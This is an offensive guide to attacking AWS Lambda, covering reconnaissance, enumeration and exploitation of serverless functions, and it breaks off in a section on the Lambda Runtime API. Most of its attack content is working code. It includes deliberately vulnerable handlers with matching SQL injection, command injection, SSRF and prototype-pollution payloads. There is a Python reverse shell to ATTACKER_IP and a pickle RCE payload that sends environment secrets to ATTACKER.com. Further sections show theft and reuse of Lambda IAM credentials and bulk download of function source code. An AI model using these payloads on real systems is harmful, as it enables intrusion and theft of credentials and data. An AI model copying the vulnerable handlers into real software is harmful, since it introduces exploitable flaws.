---
title: AWS Lambda Attacks
description: Comprehensive guide for AWS Lambda Reconnaissance, Enumeration, Exploitation, Privilege Escalation, Persistence, Data Exfiltration, and Defense Evasion techniques.
navigation:
  icon: i-lucide-zap
---

## Overview

AWS Lambda is a **serverless compute service** that runs code without provisioning servers. It is deeply integrated with IAM, API Gateway, S3, DynamoDB, SQS, and virtually every AWS service — making it a **high-value target** and a **powerful pivot point** in cloud pentests.

::card-group

  :::card
  ---
  icon: i-lucide-search
  title: Reconnaissance
  to: "#reconnaissance"
  ---
  Discover Lambda functions, endpoints, layers, and triggers across the target environment.
  :::

  :::card
  ---
  icon: i-lucide-list
  title: Enumeration
  to: "#enumeration"
  ---
  Extract function configurations, environment variables, IAM roles, policies, and source code.
  :::

  :::card
  ---
  icon: i-lucide-swords
  title: Exploitation
  to: "#exploitation"
  ---
  Injection attacks, SSRF, deserialization, dependency confusion, and runtime manipulation.
  :::

  :::card
  ---
  icon: i-lucide-arrow-up-circle
  title: Privilege Escalation
  to: "#privilege-escalation"
  ---
  Abuse Lambda execution roles, `iam:PassRole`, resource policies, and cross-service pivoting.
  :::

  :::card
  ---
  icon: i-lucide-ghost
  title: Persistence & Evasion
  to: "#persistence--evasion"
  ---
  Backdoor functions, layers, triggers, and techniques to avoid CloudTrail detection.
  :::

  :::card
  ---
  icon: i-lucide-database
  title: Data Exfiltration
  to: "#data-exfiltration"
  ---
  Extract secrets, environment variables, source code, and connected data stores.
  :::

::

---

## Lambda Architecture

::note
Understanding Lambda's internal architecture is **critical** before attacking it. Every component is a potential attack surface.
::

### How Lambda Works Internally

```
┌─────────────────────────────────────────────────────────┐
│                    API Gateway / Trigger                 │
│              (S3, SQS, DynamoDB, EventBridge)           │
└──────────────────────┬──────────────────────────────────┘
                       │ Event Payload
                       ▼
┌─────────────────────────────────────────────────────────┐
│                   Lambda Service                        │
│  ┌───────────────────────────────────────────────────┐  │
│  │              Execution Environment                │  │
│  │  ┌─────────┐  ┌──────────┐  ┌─────────────────┐  │  │
│  │  │ Runtime │  │ Function │  │  Environment    │  │  │
│  │  │ (Node/  │  │  Code    │  │  Variables      │  │  │
│  │  │ Python/ │  │          │  │  (Secrets!)     │  │  │
│  │  │ Java)   │  │          │  │                 │  │  │
│  │  └─────────┘  └──────────┘  └─────────────────┘  │  │
│  │                                                   │  │
│  │  ┌─────────────────┐  ┌────────────────────────┐  │  │
│  │  │  /tmp (512MB)   │  │  IAM Role Credentials  │  │  │
│  │  │  Writable Disk  │  │  (Auto-rotated STS)    │  │  │
│  │  └─────────────────┘  └────────────────────────┘  │  │
│  │                                                   │  │
│  │  ┌─────────────────────────────────────────────┐  │  │
│  │  │          Lambda Layers (Dependencies)       │  │  │
│  │  └─────────────────────────────────────────────┘  │  │
│  └───────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

### Attack Surface Map

| Component | Attack Surface | Risk Level |
|-----------|---------------|------------|
| **Function Code** | Injection, logic flaws, hardcoded secrets | :badge[Critical]{color="red"} |
| **Environment Variables** | Plaintext secrets, API keys, DB credentials | :badge[Critical]{color="red"} |
| **Execution Role** | Over-privileged IAM role, privesc path | :badge[Critical]{color="red"} |
| **Event Source / Trigger** | Untrusted input, injection via event data | :badge[High]{color="orange"} |
| **Layers** | Supply chain attacks, dependency poisoning | :badge[High]{color="orange"} |
| **Resource Policy** | Unauthorized cross-account invocation | :badge[High]{color="orange"} |
| **VPC Configuration** | Network pivoting, internal service access | :badge[Medium]{color="yellow"} |
| **`/tmp` Directory** | Data leakage across warm invocations | :badge[Medium]{color="yellow"} |
| **Concurrency Settings** | DoS, resource exhaustion | :badge[Low]{color="green"} |
| **Dead Letter Queue** | Information disclosure from failed events | :badge[Medium]{color="yellow"} |
| **CloudWatch Logs** | Sensitive data in logs | :badge[Medium]{color="yellow"} |

---

## Methodology

::steps{level="3"}

### Phase 1 — Discovery & Reconnaissance

Identify Lambda functions, API Gateway endpoints, triggers, and associated services. Map the serverless architecture.

### Phase 2 — Enumeration

Extract function configurations, environment variables, execution roles, layers, source code, and resource policies.

### Phase 3 — Input Analysis

Analyze event sources and input handling. Identify injection points via API Gateway, S3, SQS, DynamoDB Streams, and other triggers.

### Phase 4 — Exploitation

Exploit injection vulnerabilities, SSRF, deserialization flaws, and business logic issues within function code.

### Phase 5 — Privilege Escalation

Abuse the Lambda execution role to escalate privileges. Exploit `iam:PassRole`, resource policies, and cross-service trust.

### Phase 6 — Lateral Movement

Pivot from Lambda to other AWS services using the execution role. Access databases, S3 buckets, internal APIs, and other accounts.

### Phase 7 — Persistence & Data Exfiltration

Establish persistence through backdoored functions, layers, and triggers. Exfiltrate secrets, source code, and connected data.

::

---

## Reconnaissance

### Discovering Lambda Functions

::tip
Lambda functions are often exposed through **API Gateway**, **CloudFront**, **ALB**, or **Function URLs**. Start by identifying these entry points.
::

#### External Discovery

```bash [External Recon]
# Identify API Gateway endpoints (common Lambda frontend)
# Look for patterns in target's web traffic
curl -s https://target.com | grep -iE "execute-api|apigateway|lambda-url"

# Common API Gateway URL patterns
# https://{api-id}.execute-api.{region}.amazonaws.com/{stage}
# https://{custom-domain}/api/

# Lambda Function URLs (newer feature)
# https://{url-id}.lambda-url.{region}.on.aws/

# Enumerate via DNS / certificate transparency
# Search crt.sh for *.execute-api.*.amazonaws.com
curl -s "https://crt.sh/?q=%.execute-api.%.amazonaws.com&output=json" | jq -r '.[].name_value' | sort -u

# Search for Lambda Function URLs
curl -s "https://crt.sh/?q=%.lambda-url.%.on.aws&output=json" | jq -r '.[].name_value' | sort -u

# Google dorking
# site:execute-api.amazonaws.com target
# site:lambda-url.*.on.aws target

# Check JavaScript files for API endpoints
curl -s https://target.com/main.js | grep -oP 'https://[a-z0-9]+\.execute-api\.[a-z0-9-]+\.amazonaws\.com/[a-zA-Z0-9/_-]+'
```

#### Identify Region & Account from API Gateway

```bash [API Gateway Fingerprinting]
# API Gateway returns headers that leak info
curl -v https://API_ID.execute-api.us-east-1.amazonaws.com/prod/ 2>&1 | grep -i "x-amz\|x-amzn"

# Common response headers:
# x-amzn-RequestId
# x-amz-apigw-id
# x-amzn-trace-id (if X-Ray enabled — leaks account info)

# Trigger an error to get more info
curl https://API_ID.execute-api.us-east-1.amazonaws.com/prod/nonexistent

# Response patterns:
# {"message":"Missing Authentication Token"}  — API Gateway
# {"message":"Forbidden"}                     — WAF or authorizer
# {"message":"Internal server error"}         — Lambda crash (interesting!)
```

#### Source Code & Configuration Leaks

```bash [Source Code Discovery]
# Search GitHub for Lambda function code
# GitHub search queries:
# "lambda_handler" org:target-company
# "def handler(event" org:target-company
# "exports.handler" org:target-company
# "AWS_LAMBDA_FUNCTION_NAME" org:target-company

# TruffleHog for secrets in repos
trufflehog github --org=target-company --only-verified

# Search for serverless framework configs
# serverless.yml, template.yaml (SAM), cdk.json
# These files reveal function names, roles, env vars, triggers

# Search for exposed .env files or configs
curl -s https://target.com/.env 2>/dev/null
curl -s https://target.com/serverless.yml 2>/dev/null
```

### Infrastructure as Code Analysis

::warning
If you find IaC templates (SAM, Serverless Framework, CDK, Terraform), they often contain **complete Lambda configurations** including environment variables with secrets.
::

```yaml [serverless.yml — What to Look For]
# Typical serverless.yml file reveals:
service: target-api

provider:
  name: aws
  runtime: python3.9
  region: us-east-1
  # IAM role — check for over-privilege
  iam:
    role:
      statements:
        - Effect: Allow
          Action: '*'          # DANGEROUS — full admin
          Resource: '*'

functions:
  processPayment:
    handler: handler.process_payment
    # Environment variables — often contain secrets
    environment:
      DB_HOST: prod-db.cluster-abc123.us-east-1.rds.amazonaws.com
      DB_PASSWORD: SuperSecret123!    # HARDCODED SECRET
      STRIPE_API_KEY: sk_live_xxxxx   # API KEY LEAK
      JWT_SECRET: my-jwt-secret       # AUTH SECRET
    events:
      - http:
          path: /payment
          method: post
          # No authorizer = unauthenticated access
    # VPC config reveals internal network
    vpc:
      securityGroupIds:
        - sg-0123456789abcdef0
      subnetIds:
        - subnet-0123456789abcdef0
```

---

## Enumeration

### Function Discovery & Configuration

::steps{level="4"}

#### Step 1 — List All Functions

```bash [List Functions]
# List all Lambda functions in the account
aws lambda list-functions \
  --query 'Functions[*].[FunctionName,Runtime,Role,LastModified]' \
  --output table

# List across all regions
for region in $(aws ec2 describe-regions --query 'Regions[*].RegionName' --output text); do
  echo "=== $region ==="
  aws lambda list-functions --region $region \
    --query 'Functions[*].FunctionName' --output text 2>/dev/null
done

# Get function count per region
for region in $(aws ec2 describe-regions --query 'Regions[*].RegionName' --output text); do
  count=$(aws lambda list-functions --region $region \
    --query 'length(Functions)' --output text 2>/dev/null)
  [ "$count" != "0" ] && echo "$region: $count functions"
done
```

#### Step 2 — Extract Function Configuration

```bash [Function Configuration]
# Get complete function configuration
aws lambda get-function-configuration \
  --function-name target-function

# Key fields to examine:
# - Role (execution role ARN)
# - Environment.Variables (secrets!)
# - VpcConfig (network access)
# - Layers (dependencies)
# - Runtime (attack surface)
# - Handler (entry point)
# - Timeout / MemorySize
# - TracingConfig (X-Ray enabled?)
# - FileSystemConfigs (EFS mounts)

# Extract environment variables specifically
aws lambda get-function-configuration \
  --function-name target-function \
  --query 'Environment.Variables'

# Get ALL functions with their env vars (gold mine)
aws lambda list-functions \
  --query 'Functions[*].[FunctionName,Environment.Variables]' \
  --output json | jq '.[] | select(.[1] != null)'
```

#### Step 3 — Download Function Source Code

```bash [Download Source Code]
# Get function code download URL
aws lambda get-function \
  --function-name target-function \
  --query 'Code.Location' \
  --output text

# Download the deployment package
CODE_URL=$(aws lambda get-function \
  --function-name target-function \
  --query 'Code.Location' --output text)

curl -o function.zip "$CODE_URL"
unzip function.zip -d ./function-code/

# Download ALL functions' source code
mkdir -p ./all-functions
for func in $(aws lambda list-functions --query 'Functions[*].FunctionName' --output text); do
  echo "[+] Downloading: $func"
  url=$(aws lambda get-function --function-name "$func" --query 'Code.Location' --output text 2>/dev/null)
  if [ ! -z "$url" ]; then
    mkdir -p "./all-functions/$func"
    curl -s -o "./all-functions/$func/code.zip" "$url"
    unzip -q -o "./all-functions/$func/code.zip" -d "./all-functions/$func/" 2>/dev/null
    rm "./all-functions/$func/code.zip" 2>/dev/null
  fi
done

# Search downloaded code for secrets
grep -rn "password\|secret\|key\|token\|api_key\|apikey\|credential" ./all-functions/
grep -rn "AKIA\|ASIA" ./all-functions/  # AWS access keys
grep -rn "BEGIN RSA\|BEGIN PRIVATE" ./all-functions/  # Private keys
```

#### Step 4 — Enumerate Execution Roles

```bash [Execution Role Analysis]
# Get the execution role for a function
ROLE_ARN=$(aws lambda get-function-configuration \
  --function-name target-function \
  --query 'Role' --output text)

ROLE_NAME=$(echo $ROLE_ARN | cut -d'/' -f2)

echo "[+] Role: $ROLE_NAME"
echo "[+] ARN: $ROLE_ARN"

# Get the role's trust policy (who can assume it)
aws iam get-role --role-name $ROLE_NAME \
  --query 'Role.AssumeRolePolicyDocument'

# List attached managed policies
aws iam list-attached-role-policies --role-name $ROLE_NAME

# List inline policies
aws iam list-role-policies --role-name $ROLE_NAME

# Get inline policy documents
for policy in $(aws iam list-role-policies --role-name $ROLE_NAME --query 'PolicyNames[*]' --output text); do
  echo "=== Policy: $policy ==="
  aws iam get-role-policy --role-name $ROLE_NAME --policy-name $policy
done

# Get managed policy documents
for policy_arn in $(aws iam list-attached-role-policies --role-name $ROLE_NAME --query 'AttachedPolicies[*].PolicyArn' --output text); do
  echo "=== Policy: $policy_arn ==="
  version=$(aws iam get-policy --policy-arn $policy_arn --query 'Policy.DefaultVersionId' --output text)
  aws iam get-policy-version --policy-arn $policy_arn --version-id $version --query 'PolicyVersion.Document'
done
```

#### Step 5 — Enumerate Triggers & Event Sources

```bash [Triggers & Event Sources]
# List event source mappings (SQS, DynamoDB Streams, Kinesis, etc.)
aws lambda list-event-source-mappings \
  --function-name target-function

# Get resource policy (who can invoke this function)
aws lambda get-policy \
  --function-name target-function 2>/dev/null | jq -r '.Policy | fromjson'

# List API Gateway integrations
aws apigateway get-rest-apis
aws apigatewayv2 get-apis

# For each API, list resources and integrations
API_ID="abc123"
aws apigateway get-resources --rest-api-id $API_ID
aws apigateway get-integration \
  --rest-api-id $API_ID \
  --resource-id RESOURCE_ID \
  --http-method POST

# List function URL configs
aws lambda get-function-url-config \
  --function-name target-function 2>/dev/null

# List all functions with Function URLs
for func in $(aws lambda list-functions --query 'Functions[*].FunctionName' --output text); do
  url=$(aws lambda get-function-url-config --function-name "$func" 2>/dev/null | jq -r '.FunctionUrl')
  [ ! -z "$url" ] && echo "$func: $url"
done
```

#### Step 6 — Enumerate Layers

```bash [Lambda Layers]
# List all layers in the account
aws lambda list-layers

# List layer versions
aws lambda list-layer-versions \
  --layer-name target-layer

# Get layer version details + download URL
aws lambda get-layer-version \
  --layer-name target-layer \
  --version-number 1

# Download layer code
LAYER_URL=$(aws lambda get-layer-version \
  --layer-name target-layer \
  --version-number 1 \
  --query 'Content.Location' --output text)

curl -o layer.zip "$LAYER_URL"
unzip layer.zip -d ./layer-code/

# Check which functions use which layers
aws lambda list-functions \
  --query 'Functions[?Layers!=`null`].[FunctionName,Layers[*].Arn]' \
  --output json
```

::

### Automated Enumeration Script

```python [lambda_enum.py]
#!/usr/bin/env python3
"""
Lambda Security Enumeration Script
Discovers and analyzes all Lambda functions for security issues
"""

import boto3
import json
import re
import os
from datetime import datetime

class LambdaEnumerator:
    def __init__(self, profile=None, region=None):
        session_args = {}
        if profile:
            session_args['profile_name'] = profile
        if region:
            session_args['region_name'] = region
        
        self.session = boto3.Session(**session_args)
        self.lambda_client = self.session.client('lambda')
        self.iam_client = self.session.client('iam')
        self.findings = []
    
    def enumerate_all(self):
        """Main enumeration function"""
        print("[*] Starting Lambda enumeration...")
        
        functions = self._list_functions()
        print(f"[+] Found {len(functions)} functions")
        
        for func in functions:
            name = func['FunctionName']
            print(f"\n{'='*60}")
            print(f"[*] Analyzing: {name}")
            print(f"{'='*60}")
            
            # Get full configuration
            config = self._get_config(name)
            
            # Check environment variables for secrets
            self._check_env_vars(name, config)
            
            # Analyze execution role
            self._analyze_role(name, config.get('Role', ''))
            
            # Check resource policy
            self._check_resource_policy(name)
            
            # Check for function URL
            self._check_function_url(name)
            
            # Check VPC configuration
            self._check_vpc(name, config)
            
            # Download and analyze code
            self._analyze_code(name)
            
            # Check layers
            self._check_layers(name, config)
        
        self._print_findings()
    
    def _list_functions(self):
        functions = []
        paginator = self.lambda_client.get_paginator('list_functions')
        for page in paginator.paginate():
            functions.extend(page['Functions'])
        return functions
    
    def _get_config(self, name):
        try:
            return self.lambda_client.get_function_configuration(FunctionName=name)
        except Exception as e:
            print(f"  [-] Error getting config: {e}")
            return {}
    
    def _check_env_vars(self, name, config):
        env_vars = config.get('Environment', {}).get('Variables', {})
        if not env_vars:
            return
        
        print(f"  [+] Environment Variables: {len(env_vars)}")
        
        secret_patterns = [
            r'password', r'secret', r'key', r'token',
            r'credential', r'api_key', r'apikey', r'auth',
            r'private', r'jwt', r'session', r'connection_string',
            r'database_url', r'db_pass', r'stripe', r'twilio'
        ]
        
        for key, value in env_vars.items():
            for pattern in secret_patterns:
                if re.search(pattern, key, re.IGNORECASE):
                    self.findings.append({
                        'severity': 'CRITICAL',
                        'function': name,
                        'issue': f'Potential secret in env var: {key}',
                        'detail': f'{key}={value[:20]}...' if len(value) > 20 else f'{key}={value}'
                    })
                    print(f"  [!] CRITICAL: Secret in env var: {key}={value[:20]}...")
            
            # Check for AWS access keys
            if re.match(r'AKIA[0-9A-Z]{16}', value):
                self.findings.append({
                    'severity': 'CRITICAL',
                    'function': name,
                    'issue': f'AWS Access Key found in env var: {key}',
                    'detail': value[:10] + '...'
                })
    
    def _analyze_role(self, name, role_arn):
        if not role_arn:
            return
        
        role_name = role_arn.split('/')[-1]
        print(f"  [+] Execution Role: {role_name}")
        
        try:
            # Check attached policies
            attached = self.iam_client.list_attached_role_policies(RoleName=role_name)
            for policy in attached['AttachedPolicies']:
                print(f"      Attached: {policy['PolicyName']}")
                
                # Flag admin/powerful policies
                dangerous_policies = [
                    'AdministratorAccess', 'PowerUserAccess',
                    'IAMFullAccess', 'AmazonS3FullAccess'
                ]
                if policy['PolicyName'] in dangerous_policies:
                    self.findings.append({
                        'severity': 'CRITICAL',
                        'function': name,
                        'issue': f'Over-privileged role: {policy["PolicyName"]}',
                        'detail': f'Role {role_name} has {policy["PolicyName"]}'
                    })
            
            # Check inline policies for wildcards
            inline = self.iam_client.list_role_policies(RoleName=role_name)
            for policy_name in inline['PolicyNames']:
                doc = self.iam_client.get_role_policy(
                    RoleName=role_name, PolicyName=policy_name
                )['PolicyDocument']
                
                for statement in doc.get('Statement', []):
                    actions = statement.get('Action', [])
                    resources = statement.get('Resource', [])
                    
                    if isinstance(actions, str):
                        actions = [actions]
                    if isinstance(resources, str):
                        resources = [resources]
                    
                    if '*' in actions and '*' in resources:
                        self.findings.append({
                            'severity': 'CRITICAL',
                            'function': name,
                            'issue': 'Wildcard Action AND Resource (*:*)',
                            'detail': f'Inline policy: {policy_name}'
                        })
        except Exception as e:
            print(f"  [-] Error analyzing role: {e}")
    
    def _check_resource_policy(self, name):
        try:
            policy = self.lambda_client.get_policy(FunctionName=name)
            policy_doc = json.loads(policy['Policy'])
            
            for statement in policy_doc.get('Statement', []):
                principal = statement.get('Principal', {})
                
                # Check for public access
                if principal == '*' or principal.get('AWS') == '*':
                    self.findings.append({
                        'severity': 'CRITICAL',
                        'function': name,
                        'issue': 'Function is publicly invocable',
                        'detail': json.dumps(statement, indent=2)
                    })
                    print(f"  [!] CRITICAL: Publicly invocable!")
                
                # Check for cross-account access
                if isinstance(principal.get('AWS'), str) and ':' in principal['AWS']:
                    account = principal['AWS'].split(':')[4]
                    current_account = boto3.client('sts').get_caller_identity()['Account']
                    if account != current_account:
                        self.findings.append({
                            'severity': 'HIGH',
                            'function': name,
                            'issue': f'Cross-account invocation allowed: {account}',
                            'detail': json.dumps(statement, indent=2)
                        })
        except self.lambda_client.exceptions.ResourceNotFoundException:
            pass
        except Exception as e:
            pass
    
    def _check_function_url(self, name):
        try:
            url_config = self.lambda_client.get_function_url_config(FunctionName=name)
            auth_type = url_config.get('AuthType', 'NONE')
            url = url_config.get('FunctionUrl', '')
            
            print(f"  [+] Function URL: {url}")
            print(f"  [+] Auth Type: {auth_type}")
            
            if auth_type == 'NONE':
                self.findings.append({
                    'severity': 'HIGH',
                    'function': name,
                    'issue': 'Function URL with NO authentication',
                    'detail': f'URL: {url}'
                })
        except Exception:
            pass
    
    def _check_vpc(self, name, config):
        vpc = config.get('VpcConfig', {})
        if vpc.get('VpcId'):
            print(f"  [+] VPC: {vpc['VpcId']}")
            print(f"      Subnets: {vpc.get('SubnetIds', [])}")
            print(f"      Security Groups: {vpc.get('SecurityGroupIds', [])}")
    
    def _analyze_code(self, name):
        try:
            func = self.lambda_client.get_function(FunctionName=name)
            code_url = func['Code']['Location']
            
            # Download code
            import urllib.request
            os.makedirs(f'./lambda-loot/{name}', exist_ok=True)
            urllib.request.urlretrieve(code_url, f'./lambda-loot/{name}/code.zip')
            
            import zipfile
            with zipfile.ZipFile(f'./lambda-loot/{name}/code.zip', 'r') as z:
                z.extractall(f'./lambda-loot/{name}/')
            
            print(f"  [+] Code downloaded to ./lambda-loot/{name}/")
        except Exception as e:
            print(f"  [-] Could not download code: {e}")
    
    def _check_layers(self, name, config):
        layers = config.get('Layers', [])
        if layers:
            print(f"  [+] Layers: {len(layers)}")
            for layer in layers:
                print(f"      {layer['Arn']}")
    
    def _print_findings(self):
        print(f"\n{'='*60}")
        print(f"FINDINGS SUMMARY")
        print(f"{'='*60}")
        
        critical = [f for f in self.findings if f['severity'] == 'CRITICAL']
        high = [f for f in self.findings if f['severity'] == 'HIGH']
        medium = [f for f in self.findings if f['severity'] == 'MEDIUM']
        
        print(f"\nCRITICAL: {len(critical)}")
        print(f"HIGH: {len(high)}")
        print(f"MEDIUM: {len(medium)}")
        
        for finding in self.findings:
            print(f"\n[{finding['severity']}] {finding['function']}")
            print(f"  Issue: {finding['issue']}")
            print(f"  Detail: {finding['detail']}")


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--profile', default=None)
    parser.add_argument('--region', default=None)
    args = parser.parse_args()
    
    enumerator = LambdaEnumerator(profile=args.profile, region=args.region)
    enumerator.enumerate_all()
```

---

## Exploitation

### Event Injection Attacks

::caution
Lambda functions process events from **untrusted sources**. If input is not validated, injection attacks are possible through the **event object itself**.
::

#### Understanding Event Sources as Input

```json [API Gateway Event (Input to Lambda)]
{
  "httpMethod": "POST",
  "path": "/api/users",
  "headers": {
    "Content-Type": "application/json",
    "X-Forwarded-For": "1.2.3.4",
    "User-Agent": "Mozilla/5.0"
  },
  "queryStringParameters": {
    "id": "1 OR 1=1--",
    "search": "<script>alert(1)</script>"
  },
  "body": "{\"username\":\"admin\",\"password\":\"' OR '1'='1\"}",
  "pathParameters": {
    "userId": "../../etc/passwd"
  },
  "requestContext": {
    "identity": {
      "sourceIp": "1.2.3.4"
    }
  }
}
```

#### SQL Injection via Lambda

::tabs
  :::tabs-item{icon="i-lucide-bug" label="Vulnerable Code"}
  ```python [Vulnerable Lambda — SQLi]
  import pymysql
  import json
  import os

  def handler(event, context):
      conn = pymysql.connect(
          host=os.environ['DB_HOST'],
          user=os.environ['DB_USER'],
          password=os.environ['DB_PASS'],
          database=os.environ['DB_NAME']
      )
      
      # VULNERABLE: Direct string concatenation
      user_id = event['queryStringParameters']['id']
      query = f"SELECT * FROM users WHERE id = '{user_id}'"
      
      cursor = conn.cursor()
      cursor.execute(query)  # SQL INJECTION!
      results = cursor.fetchall()
      
      return {
          'statusCode': 200,
          'body': json.dumps(results, default=str)
      }
  ```
  :::

  :::tabs-item{icon="i-lucide-swords" label="Exploitation"}
  ```bash [SQLi via API Gateway]
  # Basic SQL injection test
  curl "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/users?id=1'+OR+'1'='1"

  # UNION-based extraction
  curl "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/users?id=1'+UNION+SELECT+1,2,3,4--"

  # Extract database info
  curl "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/users?id=1'+UNION+SELECT+database(),user(),version(),4--"

  # Using sqlmap
  sqlmap -u "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/users?id=1" \
    --dbs --batch --random-agent

  # SQLi via POST body
  curl -X POST "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"\" OR \"1\"=\"1"}'
  ```
  :::
::

#### OS Command Injection

::tabs
  :::tabs-item{icon="i-lucide-bug" label="Vulnerable Code"}
  ```python [Vulnerable Lambda — Command Injection]
  import subprocess
  import json

  def handler(event, context):
      # VULNERABLE: User input passed to shell command
      filename = event['queryStringParameters']['file']
      
      # Intended: convert a file format
      result = subprocess.run(
          f"convert /tmp/{filename} /tmp/output.png",
          shell=True,  # DANGEROUS
          capture_output=True,
          text=True
      )
      
      return {
          'statusCode': 200,
          'body': json.dumps({
              'output': result.stdout,
              'error': result.stderr
          })
      }
  ```
  :::

  :::tabs-item{icon="i-lucide-swords" label="Exploitation"}
  ```bash [Command Injection Payloads]
  # Basic command injection
  curl "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/convert?file=test;id"
  curl "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/convert?file=test%7Cid"
  curl "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/convert?file=test%60id%60"
  curl "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/convert?file=%24(id)"

  # Read environment variables (SECRETS!)
  curl "https://API.../prod/convert?file=;env"
  curl "https://API.../prod/convert?file=;printenv"

  # Read Lambda function code
  curl "https://API.../prod/convert?file=;cat+/var/task/handler.py"
  curl "https://API.../prod/convert?file=;ls+-la+/var/task/"

  # Steal IAM credentials from environment
  curl "https://API.../prod/convert?file=;echo+\$AWS_ACCESS_KEY_ID"
  curl "https://API.../prod/convert?file=;echo+\$AWS_SECRET_ACCESS_KEY"
  curl "https://API.../prod/convert?file=;echo+\$AWS_SESSION_TOKEN"

  # Steal credentials from metadata (if not in VPC)
  curl "https://API.../prod/convert?file=;curl+http://169.254.169.254/latest/meta-data/iam/security-credentials/"

  # Reverse shell (if outbound allowed)
  curl "https://API.../prod/convert?file=;python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
  ```
  :::
::

#### Server-Side Request Forgery (SSRF)

::tabs
  :::tabs-item{icon="i-lucide-bug" label="Vulnerable Code"}
  ```python [Vulnerable Lambda — SSRF]
  import urllib.request
  import json

  def handler(event, context):
      # VULNERABLE: User-controlled URL
      url = event['queryStringParameters']['url']
      
      response = urllib.request.urlopen(url)
      data = response.read().decode('utf-8')
      
      return {
          'statusCode': 200,
          'body': data
      }
  ```
  :::

  :::tabs-item{icon="i-lucide-swords" label="Exploitation"}
  ```bash [SSRF Payloads for Lambda]
  # Lambda environment credential file
  # (Lambda runtime API — different from EC2 metadata!)
  curl "https://API.../prod/fetch?url=http://localhost:9001/2018-06-01/runtime/invocation/next"

  # AWS credentials via Lambda runtime environment variables
  # In Lambda, credentials are in environment variables, not metadata service
  # But if the function is in a VPC with NAT, SSRF to internal services is possible

  # SSRF to internal services
  curl "https://API.../prod/fetch?url=http://10.0.1.50:8080/admin"
  curl "https://API.../prod/fetch?url=http://internal-api.target.local/secrets"

  # SSRF to metadata service (if Lambda is NOT in VPC)
  # Note: Lambda functions don't have traditional EC2 metadata access
  # but the execution role credentials are available via env vars

  # SSRF to internal AWS services
  curl "https://API.../prod/fetch?url=http://169.254.170.2/v2/credentials/<GUID>"

  # Cloud metadata endpoints to try
  curl "https://API.../prod/fetch?url=http://169.254.169.254/latest/meta-data/"
  curl "https://API.../prod/fetch?url=http://169.254.170.2/v2/credentials/"
  ```
  :::
::

#### Deserialization Attacks

::tabs
  :::tabs-item{icon="i-lucide-bug" label="Vulnerable Code — Python"}
  ```python [Vulnerable Lambda — Pickle Deserialization]
  import pickle
  import base64
  import json

  def handler(event, context):
      # VULNERABLE: Deserializing untrusted data
      serialized_data = event['body']
      decoded = base64.b64decode(serialized_data)
      
      # DANGEROUS: pickle.loads with untrusted input
      user_object = pickle.loads(decoded)
      
      return {
          'statusCode': 200,
          'body': json.dumps({'user': str(user_object)})
      }
  ```
  :::

  :::tabs-item{icon="i-lucide-swords" label="Exploit Payload"}
  ```python [Generate Pickle RCE Payload]
  import pickle
  import base64
  import os

  class Exploit(object):
      def __reduce__(self):
          # Execute command when deserialized
          return (os.system, (
              'curl https://ATTACKER.com/exfil?creds=$(env | base64 -w0)',
          ))

  # Generate payload
  payload = base64.b64encode(pickle.dumps(Exploit())).decode()
  print(f"Payload: {payload}")

  # Send to vulnerable Lambda
  # curl -X POST "https://API.../prod/deserialize" \
  #   -d "$payload"
  ```
  :::
::

#### Node.js Prototype Pollution

::tabs
  :::tabs-item{icon="i-lucide-bug" label="Vulnerable Code — Node.js"}
  ```javascript [Vulnerable Lambda — Prototype Pollution]
  // Vulnerable merge function
  function merge(target, source) {
      for (let key in source) {
          if (typeof source[key] === 'object' && source[key] !== null) {
              if (!target[key]) target[key] = {};
              merge(target[key], source[key]);  // VULNERABLE
          } else {
              target[key] = source[key];
          }
      }
      return target;
  }

  exports.handler = async (event) => {
      const body = JSON.parse(event.body);
      const config = {};
      
      // Merging untrusted input into object
      merge(config, body);
      
      // If isAdmin is checked elsewhere...
      if (config.isAdmin) {
          // Attacker gains admin access
          return { statusCode: 200, body: JSON.stringify({ admin: true }) };
      }
      
      return { statusCode: 200, body: JSON.stringify(config) };
  };
  ```
  :::

  :::tabs-item{icon="i-lucide-swords" label="Exploit"}
  ```bash [Prototype Pollution Payload]
  # Pollute Object.prototype to set isAdmin
  curl -X POST "https://API.../prod/merge" \
    -H "Content-Type: application/json" \
    -d '{"__proto__": {"isAdmin": true}}'

  # Alternative payloads
  curl -X POST "https://API.../prod/merge" \
    -H "Content-Type: application/json" \
    -d '{"constructor": {"prototype": {"isAdmin": true}}}'
  ```
  :::
::

### Extracting Runtime Credentials

::warning
Every Lambda function has **temporary IAM credentials** available via environment variables. If you achieve code execution, you can **steal these credentials** and use them outside of Lambda.
::

```bash [Steal Lambda Credentials]
# Lambda credentials are in environment variables (NOT metadata service)
# These are set automatically by the Lambda service

# Via command injection:
curl "https://API.../prod/vuln?cmd=env" | grep AWS

# Key environment variables:
# AWS_ACCESS_KEY_ID       — Access key
# AWS_SECRET_ACCESS_KEY   — Secret key
# AWS_SESSION_TOKEN       — Session token (REQUIRED for temp creds)
# AWS_REGION              — Region
# AWS_LAMBDA_FUNCTION_NAME — Function name
# _HANDLER                — Handler path
# AWS_EXECUTION_ENV       — Runtime info

# Via SSRF to Lambda Runtime API:
curl "https://API.../prod/vuln?url=http://127.0.0.1:9001/2018-06-01/runtime/invocation/next"

# Use stolen credentials locally:
export AWS_ACCESS_KEY_ID="ASIAXXXXXXXXXXX"
export AWS_SECRET_ACCESS_KEY="XXXXXXXXXXXXXXXXXXXXXXXX"
export AWS_SESSION_TOKEN="XXXXXXXXXXXXXXXXXXXXXXXX"

# Verify access
aws sts get-caller-identity

# Now you operate with the Lambda's execution role permissions!
```

#### Lambda Runtime API Abuse

```bash [Lambda Runtime API]
# Lambda Runtime API runs on localhost:9001
# Available endpoints:

# Get next invocation (blocks until event arrives)
# http://127.0.0.1:9001/2018-06-01/runtime/invocation/next

# Post response for invocation
